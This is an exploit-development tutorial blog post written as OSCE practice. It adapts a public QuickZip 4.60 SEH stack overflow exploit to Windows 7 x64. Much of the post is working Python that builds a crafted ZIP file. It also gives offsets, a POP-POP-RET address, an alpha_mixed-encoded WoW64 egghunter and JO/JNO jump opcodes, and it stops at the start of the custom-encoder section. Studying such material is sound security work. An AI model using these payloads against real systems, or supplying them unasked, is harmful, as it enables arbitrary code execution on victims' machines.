---
layout: post
title: "QuickZip 4.60 - Win7 x64 SEH Overflow (Egghunter) with Custom Encoder"
date: 2017-05-01 21:31:30 +1000
comments: true
categories: ["exploit development", "osce", "buffer overflow", "seh", "egghunter"]
---

As a part of my preparations for the [OSCE](https://www.offensive-security.com/information-security-certifications/osce-offensive-security-certified-expert/) exam, I have been trying to find some interesting exploits and PoC code to practice my skills on and learn something new in the exploit development department.

After some digging, I stumbled across a [QuickZip v4.60 Buffer Overflow exploit](https://www.exploit-db.com/exploits/11656/), which is very well documented by [corelanc0d3r](https://twitter.com/corelanc0d3r) in a thorough blog post [here](https://www.corelan.be/index.php/2010/03/27/quickzip-stack-bof-0day-a-box-of-chocolates/).

Since the exploit itself is from 2010, it was designed to work on 32-bit Windows XP only. I decided to try and see if I can recreate it on a 64-bit Windows 7 and damn, was that a (fun) challenge!

<!--more-->

PoC
---

To get started, I grabbed the [QuickZip v4.60 Windows XP exploit from exploit-db](https://www.exploit-db.com/exploits/11656/) and cut it down to create a simple PoC triggering a crash.

{%codeblock lang:python%}
#!/usr/bin/python
 
header_1 = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")
 
header_2 = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")
 
header_3 = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")
 
print "[+] Building PoC.."

max_size = 4064

payload = "A" * max_size
payload += ".txt"

print "[+] Length = " + str(len(payload))

exploit = header_1 + payload + header_2 + payload + header_3

mefile = open('cst.zip','w');
mefile.write(exploit);
mefile.close()

print "[+] Exploit complete!"
{% endcodeblock %}

The above code creates a ZIP of a single file named 4064 A's followed by a ".txt" extension. `Header_1`, `header_2` and `header_3` are the headers required by the ZIP file structure. I won't go into the details of it, but you can read more about it on [here](https://en.wikipedia.org/wiki/Zip_(file_format).

If you open the created ZIP file in QuickZip and try to extract its contents (or just double-click on the filename), the QuickZip will crash.


Understanding the crash
-----------------------

Ok, let's run the PoC and see what actually happens.

Create the ZIP file using Python script above, open it up with QuickZip, start `ImmunityDebugger`, attach to the QuickZip process and, in QuickZip, double click on the filename to trigger the crash. **Note:** we will be repeating this process over, and over, and over again, so get used to it!

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/1.First_crash.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/1.First_crash.png)

Awesome, we triggered a crash as expected. Also, we got an exception - see the bottom of the screen *"Access violation when writing to [00190000]"*. What this means is that we were trying to write to an invalid memory address and we triggered an exception.

Let's investigate the SEH chain.

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/1.First_crash_SEH_chain.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/1.First_crash_SEH_chain.png)

Great, it appears that we're able to control nSEH pointer! Looks very promising. Let's try to figure out the offsets.


Offsets
-------

As always, I'm going to be using `mona` ([https://github.com/corelan/mona](https://github.com/corelan/mona)) to help us out with a lot of tasks here.

First, let's generate a pattern of **4064** unique characters and put it in the payload of our PoC exploit:
```
!mona pc 4064
```

Let's trigger the crash again and see what happens.

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/2.Second crash.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/2.Second crash.png)

Hmm, the crash looks a bit different. The problem here is that `LEAVE` instruction tries to jump back to `0EEDFADE` address from the stack, which is an invalid memory address for this program.

Also, it doesn't appear that we're controlling the SEH anymore.

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/3.second crash - wrong SEH.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/3.second crash - wrong SEH.png)

However, notice that we're actually in a kernel module (see the name of the Immunity window - *"CPU - main thread, module KERNELBA"*). Pass the execution back to the program with `SHIFT + F9` and see if we trigger another exception, but in the QuickZip module.

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/4.proper crash.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/4.proper crash.png)

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/5.proper SEH.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/5.proper SEH.png)

Awesome, looks like we're back in business!

Use the following command to let mona calculate all of the offsets:
```
!mona findmsp
```

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/6.mona findmsp.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/6.mona findmsp.png)

At this stage, the most interesting offset for us is `nSEH field: offset 292`.

Let's update the PoC with offsets information and try to trigger the crash again.

{%codeblock lang:python%}
#!/usr/bin/python
 
header_1 = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")
 
header_2 = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")
 
header_3 = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")
 
print "[+] Building PoC.."

max_size = 4064
nseh_offset = 292

payload = "A" * nseh_offset     # padding for nSEH
payload += "BBBB"               # nSEH
payload += "CCCC"               # SEH
payload += "A" * (max_size - len(payload))   # padding for the rest of payload
payload += ".txt"

print "[+] Length = " + str(len(payload))

exploit = header_1 + payload + header_2 + payload + header_3

mefile = open('cst.zip','w');
mefile.write(exploit);
mefile.close()

print "[+] Exploit complete!"
{% endcodeblock %}

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/7.SEH properly overwritten.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/7.SEH properly overwritten.png)

Great, we have control of the SEH! Let's pass exception to the program (`SHIFT + F9`) and investigate further what happens.

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/8.SEH pop-pop-ret STACK view.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/8.SEH pop-pop-ret STACK view.png)

Of course another exception triggered, since `43434343` is an invalid memory address for this program, but let's see what happens on the stack - typically for SEH overflows, we'll need invoke a set of *POP-POP-RET* instructions to return to our buffer.

It'll be easy to find such instructions with `mona`, but first, we have to know what characters are we actually allowed to use. And that's where the problems start...


Badchars
--------

Well, in summary, it's most of them. Why? Because our overflow is on the filename parameter and filenames are quite restricted - generally ASCII printable characters only.

Since it would take way too long to actually manually go through it with mona and try to find all bad chars, I just assumed that I can only use pretty much entire ASCII table (characters up to 0x7F) except `0x00`, `0x0a` and `0x0d` (`NULL` byte, new line and carriage-return respectively).

This assumption may make it more difficult than it really is (since I may be avoiding characters that are actually OK to use) or may cause me even more problems later if some of the characters from my assumed range are, in fact, incorrect.

I don't really like making assumptions like this, but for the sake of this exercise, let's make an exception.

I will just need to remember to be careful and if something doesn't work, to double check bad chars once again. A bit risky, but well, bring it on!


POP-POP-RET
-----------

Let's find an exploit-friendly address of a *POP-POP-RET* instructions with mona:
```
!mona seh
```

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/9.pop-pop-ret-mona.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/9.pop-pop-ret-mona.png)

A lot of results are found (7909!), but the highlighted result looks promising - consists of all aphanumerical characters and is located in the `QuickZip.exe` binary itself, hopefully making it more cross-platform friendly as we don't need to rely on specific operating system DLLs.

The only problem here is the `0x00` byte, however, because of the address space of the program, every address starts with `0x00`... let's try and see if it'll actually break our exploit.

Update the PoC exploit replacing `CCCC` currently representing SEH with `\x33\x28\x42\x00`, trigger the crash once again and investigate SEH chain.

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/10.SEH chain with pop-pop-ret.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/10.SEH chain with pop-pop-ret.png)

Great, looks like our address wasn't scrambled and looks like we expected it to look. Set the breakpoint at it (`F2`) and press `SHIFT + F9` to pass the control to the program.

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/11.pop-pop-ret instructions.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/11.pop-pop-ret instructions.png)

As you can see, we're redirected to *POP-POP-RET* instructions, let's step through them with `F8` and stop after `RETN 4` instruction.

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/12.after pop pop ret.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/12.after pop pop ret.png)

Awesome, we have landed back in our payload... but there's a problem. Because of the `NULL` byte, everything after SEH chain got cut off, not leaving us much space to do anything at all.


Where did the shellcode go?!
----------------------------

OK, let's analyse the situation and see where are we at.

We get our crash and we control SEH, great! The problem is that we're limited to a very restricted set of characters to use with our payload and, because we had to use address with `NULL` byte to invoke *POP-POP-RET* instructions, signifcant portion of our payload got cut off and the remaining space for our shellcode is not very big at all.

But how big is it exactly? Remember that we still have the padding we used at the beginning of our payload to get to SEH:

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/13.before landing in SEH.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/13.before landing in SEH.png)

So how much space do we have? Exactly **292** bytes. Unfortunately it is not enough for any useful shellcode that would also need to be encoded to only contain ASCII printable characters.

This sounds like something that could be potentially solved with an egghunter!

**Egghunter** is simply a bunch of instructions that look for a specific, known sequence of bytes (an "egg") in the memory space of the program and, once it's found, redirects exection to that area.

This way, we don't really need to worry where our shellcode ends up, we can just call egghunter routine and it'll find it for us!

Sounds great, but the next question is, does the 'cut off' portion of the payload actually ends up anywhere in the memory? Let's find out.

Let's generate pattern of **3764** unique characters (to fill in our payload after the `NULL` byte) and replace existing A's with it.
```
!mona pc 3764
```

Let's trigger the crash and, as we get our first exception, do not pass the exception to the program, but instead invoke the following command to search for the previously generated pattern in memory:
```
!mona findmsp
```

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/14.rest of payload in memory.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/14.rest of payload in memory.png)

Fantastic! The entire 'cut off' portion of the payload is still in the memory, so we should be able to successfully use the egghunter to get to our shellcode.


Egghunter
---------

So now we know that we should be able to use an egghunter to get to our shellcode, but we only have **292** bytes at our disposal. We can actually do quite a lot with 292 bytes, however, we need to remember that we can only use very limited character set. 

Let's try to encode the egghunter with metasploit's `x86/alpha_mixed` encoder and see how much space we'll have left after this.

Firstly, let's generate egghunter payload. Remember that we're dealing with 64-bit OS, so we need to use appropriate egghunter routine as well (a lot more detailed information on it can be found on [https://www.corelan.be/index.php/2011/11/18/wow64-egghunter/](https://www.corelan.be/index.php/2011/11/18/wow64-egghunter/)):

```
!mona egghunter -wow64
```

Copy the generated bytes into a text file and convert it into a binary file using `xxd`:

```
# cat egghunter-wow64.txt 
31db53535353b3c06681caff0f42526a265833c98bd464ff135e5a3c0574e9b8773030748bfaaf75e4af75e1ffe7
# cat egghunter-wow64.txt | xxd -r -p > egghunter-wow64.bin
```

Now, we need to use an encoder to ensure only ASCII printable characters are actually used.

```
# msfencode -e x86/alpha_mixed bufferregister=eax -i egghunter-wow64.bin
[*] x86/alpha_mixed succeeded with size 146 (iteration=1)

buf = 
"\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49" +
"\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30" +
"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42" +
"\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x66\x51\x49\x4b" +
"\x52\x73\x53\x63\x62\x73\x36\x33\x4e\x53\x6f\x30\x75\x36" +
"\x6d\x51\x59\x5a\x49\x6f\x36\x6f\x72\x62\x71\x42\x42\x4a" +
"\x66\x46\x56\x38\x74\x73\x78\x49\x4c\x4b\x4b\x64\x61\x74" +
"\x49\x6f\x47\x63\x31\x4e\x50\x5a\x77\x4c\x77\x75\x53\x44" +
"\x49\x79\x38\x38\x52\x57\x36\x50\x50\x30\x33\x44\x6c\x4b" +
"\x59\x6a\x4e\x4f\x32\x55\x38\x64\x4e\x4f\x70\x75\x6b\x51" +
"\x6b\x4f\x79\x77\x41\x41"
```

*Note:* I have used `bufferedregister=eax` option. The reason being is that the encoder needs to find where it is in the memory to be able to carry on with decoding the payload. Originally, the routines responsible for doing this are not in the ASCII printable set and therefore would be breaking our payload. 

Specifying `bufferregister` option basically tells the encoder not to worry about finding its own place in memory as we'll do it beforehand and we'll put its address in the EAX register. This way, our encoded egghunter is purely ASCII characters only (more information on generating alphanumeric shellcode can be found [here](https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/)).

Let's update our PoC exploit to reflect what we have done so far.

{%codeblock lang:python%}
#!/usr/bin/python
 
header_1 = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")
 
header_2 = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")
 
header_3 = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")
 
print "[+] Building PoC.."

max_size = 4064
nseh_offset = 292

# msfencode -e x86/alpha_mixed bufferregister=eax -i egghunter-wow64.bin
# [*] x86/alpha_mixed succeeded with size 146 (iteration=1)
egghunter = ("\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42"
"\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x66\x51\x49\x4b"
"\x52\x73\x53\x63\x62\x73\x36\x33\x4e\x53\x6f\x30\x75\x36"
"\x6d\x51\x59\x5a\x49\x6f\x36\x6f\x72\x62\x71\x42\x42\x4a"
"\x66\x46\x56\x38\x74\x73\x78\x49\x4c\x4b\x4b\x64\x61\x74"
"\x49\x6f\x47\x63\x31\x4e\x50\x5a\x77\x4c\x77\x75\x53\x44"
"\x49\x79\x38\x38\x52\x57\x36\x50\x50\x30\x33\x44\x6c\x4b"
"\x59\x6a\x4e\x4f\x32\x55\x38\x64\x4e\x4f\x70\x75\x6b\x51"
"\x6b\x4f\x79\x77\x41\x41")

payload = egghunter
payload += "A" * (nseh_offset - len(payload))   # padding for nSEH
payload += "BBBB"                               # nSEH
payload += "\x33\x28\x42\x00"                   # SEH
payload += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev"
payload += ".txt"

print "[+] Length = " + str(len(payload))

exploit = header_1 + payload + header_2 + payload + header_3

mefile = open('cst.zip','w');
mefile.write(exploit);
mefile.close()

print "[+] Exploit complete!"

{% endcodeblock %}

Let's trigger the crash, pass execution to the program and execute *POP-POP-RET* instructions. After this, scroll up in the CPU window and try to find end of egghunter payload and long set of `INC ECX` instructions (representing A characters).

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/16 found egghunter.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/16 found egghunter.png)

Great, looks like it's there and it appears to be correct as well - no bad characters were used!


Jumping back
------------

Now, we have few more things to look after - the most important thing to remember here is that we need to put address of where the egghunter begins into the EAX and jump to it.

How can we do it having a limited space? Well, first of all - how much space do we have? Quick maths tells us that it's **146** bytes (nseh offset minus the size of egghunter).

What can we do with 146 bytes? We only need to write few instructions, but they need to adhere to the limited character set we're allowed to use. In this case, we cannot use a generic encoder that we already used for egghunter as we simply don't have enough space to fit it in.

This leaves us with one option - we'll need to create our own encoder! It sounds scary and complicated, but it's actually a lot simpler than it seems.

But first, let's see where we are in the program currently.

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/12.after pop pop ret.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/12.after pop pop ret.png)

So we only have **4** bytes at our disposal to jump back to the payload and start writing our custom encoder. Also, those 4 bytes would need to be, preferably, alphanumeric. Thankfully, there are few instructions we can use, specifically in situations like those!

Credit given where credit's due - thanks to [TheColonial](https://twitter.com/TheColonial) for sharing this very useful trick: [http://buffered.io/posts/jumping-with-bad-chars/](http://buffered.io/posts/jumping-with-bad-chars/).

In short, we can simply use `JO` and `JNO` instructions to invoke short jumps back into our payload. But how far can we jump? After some playing around with allowed characters I found that some of the bad characters are converted to `A2`, which translates to 92 in decimal... which should give us just enough space to allow us to create our custom encoder.

Let's generate the required OPCODES with `metasm` and add them in our payload in place of nSEH.

```
metasm > jno $-99
"\x71\x9b"
metasm > jo $-99
"\x70\x9b"
```

*Note:* `\x9b` (-99), since it's a bad character, will actually be converted into `\xa2` (-92).

The portion of our PoC should now look like this:

{%codeblock lang:python%}
payload = egghunter
payload += "A" * (nseh_offset - len(payload))   # padding for nSEH
payload += "\x71\x9b\x70\x9b"                   # nSEH: jno $-99; jo $-99 ==> 9b will actually be converted to A2, which is $-92
payload += "\x33\x28\x42\x00"                   # SEH
payload += pattern                              # pattern to look for in memory
payload += ".txt"
{% endcodeblock %}

Let's trigger the crash, pass execution to the program, step through the *POP-POP-RET* instructions and observe what happens when we step through the `JNO`/`JO` instructions.

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/17.jno jump taken.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/17.jno jump taken.png)

Awesome, the jump is taken and we land in our payload! Let's now create our custom encoder to write instructions to jump to the egg hunting routine.


Custom encoder
--------------

We need to write several instructions to be able to jump to our egghunter, however, there is no way to write them directly without using bad characters.

To get around it we'll need to do the following:

1. Find out what are the opcodes of instructions we want to write
2. Using simple, mathematical instructions (namely `ADD` and `SUB`) we'll place values of the opcodes from step above into a register of our choice (e.g. `EAX`) using only allowed characters
3. We'll write value of this register onto the stack, effectively writing the instructions we want to the area pointed to by `ESP`

Sounds complicated? It's actually not that bad and it makes a lot more sense once you start playing with it.

